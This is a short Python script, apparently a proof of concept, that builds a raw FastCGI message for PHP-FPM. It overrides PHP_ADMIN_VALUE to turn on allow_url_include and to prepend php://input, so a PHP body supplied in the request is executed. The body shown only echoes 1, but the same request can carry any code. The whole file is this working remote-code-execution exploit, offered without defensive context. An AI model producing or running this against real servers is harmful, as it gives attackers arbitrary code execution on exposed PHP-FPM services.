import struct
import sys

# Reconstructed parameter-bearing FastCGI fragment; no delivery or heap assumptions.
def record(kind, body):
    return struct.pack('!BBHHBB', 1, kind, 1, len(body), 0, 0) + body

def nv(name, value):
    name, value = name.encode(), value.encode()
    def length(n):
        return bytes([n]) if n < 128 else struct.pack('!I', n | 0x80000000)
    return length(len(name)) + length(len(value)) + name + value

environment = {
    'SCRIPT_FILENAME': '/opt/site/public/front.php',
    'REQUEST_METHOD': 'POST',
    'REMOTE_ADDR': '127.0.0.1',
    'PHP_ADMIN_VALUE': 'auto_prepend_file = "php://input"\nallow_url_include = on',
}
begin = struct.pack('!HB5x', 1, 1)
message = record(1, begin) + record(4, b''.join(nv(k, v) for k, v in environment.items()))
message += record(4, b'') + record(5, b'<?php echo 1; ?>') + record(5, b'')
if __name__ == '__main__':
    sys.stdout.buffer.write(message)
